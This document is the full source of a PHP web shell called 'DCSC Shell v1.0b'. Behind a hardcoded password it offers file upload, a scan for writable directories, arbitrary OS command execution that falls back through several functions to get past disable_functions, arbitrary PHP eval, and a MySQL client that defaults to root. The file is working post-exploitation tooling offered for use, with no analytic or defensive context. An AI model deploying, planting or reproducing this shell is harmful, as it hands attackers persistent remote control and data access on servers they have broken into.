<?php
session_start();
error_reporting(0);
set_time_limit(0);

/*
	Jean-Pierre LESUEUR
    @DarkCoderSc
    
    https://www.twitter.com/DarkCoderSc
    
    License : MIT
*/
$admin_password = "darkcodersc"; // Change the password !!!
?>
<!doctype html><html lang="en"><head>
<meta charset="utf-8">
<title></title>
<style>
    body {
        font-family : sans-serif;
        background : #fafafa;
    }

    #logform {
        margin-top : 100px;        
    }

    #aUploader {
        margin-top : 60px;
    }

    hr {
        border : 0;
        height : 4px;
        background : #e8e8e8;
        margin : 18px 0 18px 0;
    }

    #navbar {
        position : fixed;
        bottom : 0;
        left : 0;
        width : 100%;
        display : block;    
        height : 55px; 
        background : #23272b;          
    }

    #navbar ul {
        list-style-type: none;
        margin: 0;
        padding: 0;
        overflow: hidden;
        line-height : 55px;
        display: flex;
        justify-content: center;
    
    }

    #navbar li {
        color : #fff;
        text-transform : uppercase;      
        font-weight : normal;          
    }

    #navbar li a {
        font-weight : bold;         
        color : #FFF;
        text-decoration : none;
        
        display : inline-block;
        padding : 0px 16px 0 16px;
    }

    #navbar li.brand {
        padding-right : 16px;
        color : lime;
    }

    #navbar li a:hover {
        background : #000;
        cursor : pointer;
    }

    #db-helper {
        
    }

    #eof {
        height : 70px;
    }

    #db-helper .form-control {
        max-width : 350px;
    
    }

    /* RIPPED BOOTSTRAP */
    table {
        border-collapse: collapse;
    }

    .table {
        width: 100%;
        margin-bottom: 1rem;
        color: #212529;
        vertical-align: top;

        display: block;
        overflow-x: auto;
        white-space: nowrap;
    }

    .table th,
    .table td {
        padding: 0.5rem;
        border-bottom: 1px solid #dee2e6;
    }

    .table tbody {
        vertical-align: inherit;
    }

    .table thead th {
        vertical-align: bottom;
        border-bottom-color: #495057;
    }

    .table tbody + tbody {
        border-top: 2px solid #dee2e6;
    }

    .table-dark,
    .table-dark > th,
    .table-dark > td {
        background-color: #c6c8ca;
    }

    .table-dark th,
    .table-dark td,
    .table-dark thead th,
    .table-dark tbody + tbody {
        border-color: #95999c;
    }

    .table-hover .table-dark:hover {
        background-color: #b9bbbe;
    }

    .table-hover .table-dark:hover > td,
    .table-hover .table-dark:hover > th {
        background-color: #b9bbbe;
    }

    .table-dark {
        color: #fff;
        background-color: #343a40;
    }

    .table-dark th,
    .table-dark td,
    .table-dark thead th {
        border-color: #454d55;
    }

    .table-dark.table-bordered {
        border: 0;
    }

    .table-dark.table-striped tbody tr:nth-of-type(odd) {
        background-color: rgba(255, 255, 255, 0.05);
    }

    .table-dark.table-hover tbody tr:hover {
        color: #fff;
        background-color: rgba(255, 255, 255, 0.075);
    }

    .form-control {
        display: block;
        width: 100%;
        min-height: calc(1.5em + 0.75rem + 2px);
        padding: 0.375rem 0.75rem;
        font-size: 1rem;
        font-weight: 400;
        line-height: 1.5;
        color: #495057;
        background-color: #fff;
        background-clip: padding-box;
        border: 1px solid #ced4da;
        border-radius: 0.25rem;
        transition: border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;
        margin-bottom : 10px;
    }

    @media (prefers-reduced-motion: reduce) {
    .form-control {
        transition: none;
    }
    }

    .form-control::-ms-expand {
        background-color: transparent;
        border: 0;
    }

    .form-control:focus {
        color: #495057;
        background-color: #fff;
        border-color: #8bbafe;
        outline: 0;
        box-shadow: 0 0 0 0.2rem rgba(13, 110, 253, 0.25);
    }

    .form-control::-webkit-input-placeholder {
        color: #6c757d;
        opacity: 1;
    }

    .form-control::-moz-placeholder {
        color: #6c757d;
        opacity: 1;
    }

    .form-control:-ms-input-placeholder {
        color: #6c757d;
        opacity: 1;
    }

    .form-control::-ms-input-placeholder {
        color: #6c757d;
        opacity: 1;
    }

    .form-control::placeholder {
        color: #6c757d;
        opacity: 1;
    }

    .form-control:disabled, .form-control[readonly] {
        background-color: #e9ecef;
        opacity: 1;
    }

    .form-control-plaintext {
        display: block;
        width: 100%;
        padding: 0.375rem 0;
        margin-bottom: 0;
        line-height: 1.5;
        color: #212529;
        background-color: transparent;
        border: solid transparent;
        border-width: 1px 0;
    }

    .form-control-plaintext.form-control-sm, .form-control-plaintext.form-control-lg {
        padding-right: 0;
        padding-left: 0;
    }

    .form-control-sm {
        min-height: calc(1.5em + 0.5rem + 2px);
        padding: 0.25rem 0.5rem;
        font-size: 0.875rem;
        border-radius: 0.2rem;
    }

    .form-control-lg {
        min-height: calc(1.5em + 1rem + 2px);
        padding: 0.5rem 1rem;
        font-size: 1.25rem;
        border-radius: 0.3rem;
    }

    .form-control-color {
        max-width: 3rem;
        padding: 0.375rem;
    }

    .form-control-color::-moz-color-swatch {
        border-radius: 0.25rem;
    }

    .form-control-color::-webkit-color-swatch {
        border-radius: 0.25rem;
    }

    h1, .h1, h2, .h2, h3, .h3, h4, .h4, h5, .h5, h6, .h6 {
        margin-top: 0;
        margin-bottom: 0.5rem;
        font-weight: 500;
        line-height: 1.2;
        text-transform : uppercase;
    }

    h1, .h1 {
        margin-top : 40px;
        font-size: 1.7rem;
    }

    h2, .h2 {
        margin-top : 25px;
        font-size: 1.4rem;
    }

    .container {        
        padding-right: 15px;
        padding-left: 15px;
    
        margin-right: auto;
        margin-left: auto;
    }

    @media (min-width: 1200px){
        .container {
            width: 1170px;
        }
    }

    .alert {
        padding: 8px 35px 8px 14px;
        margin-bottom: 18px;
        text-shadow: 0 1px 0 rgba(255, 255, 255, 0.5);
        background-color: #fcf8e3;
        border: 1px solid #fbeed5;
        -webkit-border-radius: 4px;
        -moz-border-radius: 4px;
        border-radius: 4px;
        color: #c09853;
    }

    .alert-success {
        background-color: #dff0d8;
        border-color: #d6e9c6;
        color: #468847;
    }

    .alert-danger,
    .alert-error {
        background-color: #f2dede;
        border-color: #eed3d7;
        color: #b94a48;
    }
    .alert-info {
        background-color: #d9edf7;
        border-color: #bce8f1;
        color: #3a87ad;
    }

    pre {
        font-family: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
        display: block;
        margin-top: 10px 0 10px 0;
        margin-bottom: 1rem;
        overflow: auto;
        font-size: 0.875em;
        padding : 15px 8px 15px 8px;
        color: #d63384;
        word-wrap: break-word;
        background : #fafafa;

    }

    .btn {
        display: inline-block;
        font-weight: 400;
        line-height: 1.5;
        color: #212529;
        text-align: center;
        vertical-align: middle;
        cursor: pointer;
        -webkit-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
        background-color: transparent;
        border: 1px solid transparent;
        padding: 0.375rem 0.75rem;
        font-size: 1rem;
        border-radius: 0.25rem;
        transition: color 0.15s ease-in-out, background-color 0.15s ease-in-out, border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;
    }

    .btn:hover {
        color: #212529;
        text-decoration: none;
    }

    .btn:focus, .btn.focus {
        outline: 0;
        box-shadow: 0 0 0 0.2rem rgba(13, 110, 253, 0.25);
    }

    .btn.disabled, .btn:disabled {
        opacity: 0.65;
    }

    .btn-dark {
        color: #fff;
        background-color: #343a40;
        border-color: #343a40;
    }

    .btn-dark:hover {
        color: #fff;
        background-color: #23272b;
        border-color: #1d2124;
    }

    .btn-dark:focus, .btn-dark.focus {
        color: #fff;
        background-color: #23272b;
        border-color: #1d2124;
        box-shadow: 0 0 0 0.2rem rgba(82, 88, 93, 0.5);
    }

    .btn-dark.disabled, .btn-dark:disabled {
        color: #fff;
        background-color: #343a40;
        border-color: #343a40;
    }

    .btn-dark:not(:disabled):not(.disabled):active, .btn-dark:not(:disabled):not(.disabled).active,
        .show > .btn-dark.dropdown-toggle {
        color: #fff;
        background-color: #1d2124;
        border-color: #171a1d;
        }

    .btn-dark:not(:disabled):not(.disabled):active:focus, .btn-dark:not(:disabled):not(.disabled).active:focus,
        .show > .btn-dark.dropdown-toggle:focus {
        box-shadow: 0 0 0 0.2rem rgba(82, 88, 93, 0.5);
    }
    /* RIPPED BOOTSTRAP */
</style>
</head><body>
<section class="container" id="main">

<?php
/* AUTHENTICATION */
if (!isset($_SESSION["logged"]) || $_SESSION["logged"] != true) {
    $success = false;

    if (isset($_POST["admpwd"])) {
        if ($_POST["admpwd"] == $admin_password) {            
            $_SESSION["logged"] = true;            

            $success = true;
        }
    }

    if (!$success) {
        echo "
            <form method=\"POST\" id=\"logform\" action=\"#\">
                <label for=\"admpwd\">Password : </label>
                <input id=\"admpwd\" name=\"admpwd\" type=\"password\" class=\"form-control\" placeholder=\"Please enter your password\"/>
                <input type=\"submit\" value=\"Login\" class=\"btn btn-dark\"/>
            </form>
        ";
    }
} 

if (isset($_SESSION["logged"]) && $_SESSION["logged"]) {
    /* ACTIONS */
    echo "
        <div id=\"navbar\">
            <ul>
                <li class=\"brand\">DCSC Shell v1.0b</li>
                <li><a href=\"#aUploader\">File Uploader</a></li>
                <li><a href=\"#aShell\">Shell</a></li>
                <li><a href=\"#aEval\">Eval PHP</a></li>
                <li><a href=\"#aMYSQL\">MySQL</a></li>                
            </ul>
        </div>
    ";

    $message  = "";
    $upload_destpath = (isset($_POST["destpath"]) ? $_POST["destpath"] : "/tmp");

    echo "<h1 id=\"aUploader\">File Uploader</h1>";

    function includeTrailingPathDelimiter($path) {
        $check = substr($path, -1);  

        if ($check != DIRECTORY_SEPARATOR) {
            return $path . DIRECTORY_SEPARATOR;
        } else {
            return $path;
        }
    }

    $upload_message = "";
    $upload_alert_class = "danger";
    if (isset($_FILES["file"]) && !empty($upload_destpath)) {
        if (!file_exists($upload_destpath)) {
            $upload_message = "Destination path must exists!";
        } else {
            if (!is_writable($upload_destpath)) {
                $upload_message = "Access denied to write on destination path!";
            } else {
                $filename = includeTrailingPathDelimiter($upload_destpath) . basename($_FILES["file"]["name"]);

                if(move_uploaded_file($_FILES["file"]["tmp_name"], $filename)) {
                    $upload_message = sprintf("Successfully uploaded : %s", htmlspecialchars($filename));
                    $upload_alert_class = "success";
                } else {
                    $upload_message = sprintf("Error %d during upload process!", $_FILES["file"]["error"]);
                }
            }
        }
    }

    if (!empty($upload_message)) {
        echo "<div class=\"alert alert-$upload_alert_class\">";
        echo "<p>" . $upload_message . "<p>";
        echo "</div>";
    }

    echo "<form method=\"POST\" action=\"#aUploader\" enctype=\"multipart/form-data\">
            <input class=\"form-control\" type=\"text\" id=\"destpath\" name=\"destpath\" placeholder=\"Destination path Ex: /tmp\" value=\"". htmlspecialchars($upload_destpath) ."\"/>
            <br/>
            <input type=\"file\" name=\"file\"/><br/><br/>
            <input class=\"btn btn-dark\" type=\"submit\" value=\"Upload\"/>
        </form>";
        
    echo "<h2 id=\"aWDir\">Find Writable Directories</h2>";

    function findWritableDirectories($base_directory) {
        $base_directory = includeTrailingPathDelimiter($base_directory);

        $files = @scandir($base_directory);

        if (count($files) == 0) {
            return;
        }

        foreach ($files as $file) {
            if ($file == "." || $file == "..") {
                continue;
            }
                
            $fullpath = $base_directory . $file;

            if (is_dir($fullpath)) {
                if (is_writable($fullpath)) {
                    echo "<li><code>" . $fullpath . "</code></li>";
                }

                findWritableDirectories($fullpath);
            }
        }
    }

    echo "<div class=\"alert alert-info\"><p>Notice : This feature could take a while.</p></div>";

    echo "
            <form method=\"POST\" action=\"#aWDir\">
                <label>Base Path : </label>
                <input class=\"form-control\" type=\"text\" id=\"fwdirsBase\" name=\"fwdirsBase\" value=\"" . htmlspecialchars($fwdirs_base) . "\"/>
                <br/>
                <input type=\"submit\" name=\"findWDirs\" class=\"btn btn-dark\" value=\"Search\"/>
            </form>
        ";

    $fwdirs_base = (isset($_POST["fwdirsBase"]) ? $_POST["fwdirsBase"] : "/");

    if (!empty($fwdirs_base) && isset($_POST["findWDirs"])) {
        echo "<ul>";
        findWritableDirectories($fwdirs_base);
        echo "</ul>";
    }

    echo "<hr/>";

    echo "<h1 id=\"aShell\">Shell</h1>";

    $shell_command = (isset($_POST["cmd"]) ? $_POST["cmd"] : "");

    $output = "";

    echo "
            <form method=\"POST\" action=\"#aShell\">
                <input class=\"form-control\" type=\"text\" style=\"width : 100%;\" id=\"cmd\" name=\"cmd\" placeholder=\"Command\" value=\"" . htmlspecialchars($shell_command) . "\"/>  
                <br/>
                <input type=\"submit\" class=\"btn btn-dark\" value=\"Execute >\"/>
            </form>
        ";

    if (!empty($shell_command)) {
        $disabled_functions = strtolower(ini_get("disable_functions"));

        /*
            This could be done more cleaner, but the goal is to support most version
            of PHP.
        */
        if (strpos($disabled_functions, "shell_exec") === false) {
            $output = shell_exec($shell_command);
        } else if (strpos($disabled_functions, "exec") === false) { 
            $output = exec($shell_command);
        } else if (strpos($disabled_functions, "system") === false) {
            $output = system($shell_command);
        } else if (strpos($disabled_functions, "passthru") === false) {
            $output = passthru($shell_command);
        }

        echo "<pre>";
        if (!empty($output)) {
            echo "$output";
        } else {
            echo "No output.";
        }
        echo "</pre>";
    }

    echo "<hr/>";

    echo "<h1 id=\"aEval\">Eval PHP</h1>";

    $php_eval_code = (isset($_POST["phpCode"]) ? $_POST["phpCode"] : "");

    echo "
            <form method=\"POST\" action=\"#aEval\">
                <textarea  class=\"form-control\" style=\"width : 100%; height:250px;\" id=\"phpCode\" name=\"phpCode\" placeholder=\"PHP Code\"></textarea>
                <br/> 
                <input class=\"btn btn-dark\" value=\"Run\" type=\"submit\"/>
            </form>
        ";

    if (!empty($php_eval_code)) {
        echo "<pre>";
        eval($php_eval_code);
        echo "</pre>";
    }

    echo "<hr/>";

    echo "<h1 id=\"aMYSQL\">MySQL Helper</h1>";

    $dbhost  = (isset($_POST["dbhost"]) ? $_POST["dbhost"] : "127.0.0.1");
    $dbuser  = (isset($_POST["dbuser"]) ? $_POST["dbuser"] : "root");
    $dbpwd   = (isset($_POST["dbpwd"]) ? $_POST["dbpwd"] : "");
    $dbname  = (isset($_POST["dbname"]) ? $_POST["dbname"] : "");
    $dbquery = (isset($_POST["dbquery"]) ? $_POST["dbquery"] : "SHOW DATABASES;");

    $db_alert_class = "danger";
    $db_message = "";

    class Db {
        private $sock = null;
        private $sqliMode = False;
        private $dbhost = "";
        private $dbuser = "";
        private $dbpwd = "";
        private $dbname = "";

        function fieldName($result, $field_offset) {
            if (!$this->sock) return false;

            if (!$this->sqliMode) {
                return mysql_field_name($result, $field_offset);
            } else {
                $properties = mysqli_fetch_field_direct($result, $field_offset);
                return is_object($properties) ? $properties->name : false;
            }    
        }

        function numFields($result) {
            if (!$this->sock) return false;

            if (!$this->sqliMode) {
                return mysql_num_fields($result);
            } else {
                return mysqli_num_fields($result);
            }
        }

        function getLastError() {
            if (!$this->sock) {
                return "Not connected.";
            }

            if (!$this->sqliMode) {
                return mysql_error($this->sock);
            } else {                
                return mysqli_error($this->sock);
            }
        }

        function query($query) {
            if (!$this->sock) return false;

            if (!$this->sqliMode) { 
                return mysql_query($query);   
            } else {
                return mysqli_query($this->sock, $query);
            }        
        }

        function fetchRows($result) {
            if (!$this->sock) return false;

            $rows = [];

            if (!$this->sqliMode) {
                while ($row = mysql_fetch_array($result, MYSQL_NUM)) {
                    array_push($rows, $row);
                }
            } else {
                while ($row = mysqli_fetch_array($result, MYSQLI_NUM)) {
                    array_push($rows, $row);
                }
            }
            
            return $rows;
        }

        function connect() {
            if (function_exists("mysqli_connect") || function_exists("mysql_connect")) {
                $this->sqliMode = function_exists("mysqli_connect");
                ///            

                if ($this->sqliMode) {
                    $sock = mysqli_connect($this->dbhost, $this->dbuser, $this->dbpwd, $this->dbname);

                    if (!$sock) {
                        return mysqli_connect_error();
                    }

                    $this->sock = $sock;

                    ///
                    return true;
                } else {
                    $sock = mysql_connect($this->dbhost, $this->dbuser, $this->dbpwd);                    

                    if (!$sock) {
                        return mysql_error();
                    }                    

                    if (!empty($this->dbname)) {
                        if (!mysql_select_db($this->dbname)) {
                            return mysql_error($sock);
                        }
                    }            

                    $this->sock = $sock;

                    ///
                    return true;
                }
            } else {
                return "Could not use MYSQL. (Is extension enabled : mysql or mysqli ?)";
            }
        }

        function __construct($dbhost, $dbuser, $dbpwd, $dbname = "") {    
        $this->dbhost = $dbhost;
        $this->dbuser =  $dbuser;
        $this->dbpwd = $dbpwd;
        $this->dbname = $dbname;
        }

        function __destruct() {
            if ($this->sock !== false) {
                if ($this->sqliMode) {
                    mysqli_close($this->sock);
                } else {
                    mysql_close($this->sock);
                }
            }

            $this->sock = null;
        }
    }

    if (!empty($dbhost) && !empty($dbuser) && !empty($dbquery) && isset($_POST["doQuery"])) {
        $db = new Db($dbhost, $dbuser, $dbpwd, $dbname);

        $result = $db->connect();
        if ($result === true) {
            $result = $db->query($dbquery);

            if ($result) {
                $column_count = $db->numFields($result);

                $db_table = "<table class=\"table table-dark\"><thead><tr>";

                /* Column header */
                for ($i = 0; $i < $column_count; $i++) {
                    $db_table .= "<th>" . $db->fieldName($result, $i) . "</th>";
                }      

                $db_table .= "</tr></thead><tbody>";

                /* Rows */         
                $rows = $db->fetchRows($result);

                for ($n = 0; $n < count($rows); $n++) {                    
                    $db_table .= "<tr>";                
                    for ($i = 0; $i < $column_count; $i++) {
                        $db_table .= "<td>" . $rows[$n][$i] . "</td>";
                    }                
                    $db_table .= "</tr>";                
                }            
                $db_table .= "</tbody></table>";
            } else {
                $db_message = $db->getLastError();
            }
        } else {
            $db_message = $result;
        }
        unset($db);
    }    

    if (!empty($db_message)) {
        echo "<div class=\"alert alert-$db_alert_class\">";
        echo "<p>" . $db_message . "<p>";
        echo "</div>";
    }

    echo "
        <form id=\"db-helper\" method=\"POST\" action=\"#aMYSQL\">
            <label>DB Host : </label>
            <input for=\"dbhost\" type=\"text\" class=\"form-control\" id=\"dbhost\" name=\"dbhost\" value=\"" . htmlspecialchars($dbhost) . "\"/>

            <label>DB User : </label>
            <input for=\"dbuser\" type=\"text\" class=\"form-control\" id=\"dbuser\" name=\"dbuser\" value=\"" . htmlspecialchars($dbuser) . "\"/>

            <label>DB Password (Optional): </label>
            <input for=\"dbpwd\" type=\"text\" class=\"form-control\" id=\"dbpwd\" name=\"dbpwd\" value=\"" . htmlspecialchars($dbpwd) . "\"/>

            <label for=\"dbname\">DB Name (Optional) : </label>
            <input type=\"text\" class=\"form-control\" id=\"dbname\" name=\"dbname\" value=\"" . htmlspecialchars($dbname) . "\"/>

            <label for=\"dbquery\">SQL Query : </label>
            <textarea id=\"dbquery\" name=\"dbquery\" class=\"form-control\" style=\"max-width:100%;height:200px;\">" . htmlspecialchars($dbquery) . "</textarea>

            <input name=\"doQuery\" type=\"submit\" value=\"Execute >\" class=\"btn btn-dark\"/>
        </form>
    ";

    if (!empty($db_table)) {
        echo "<h2>Query Result</h2>";

        echo $db_table;
    }
}
?>
<div id="eof"></div></section></body></html>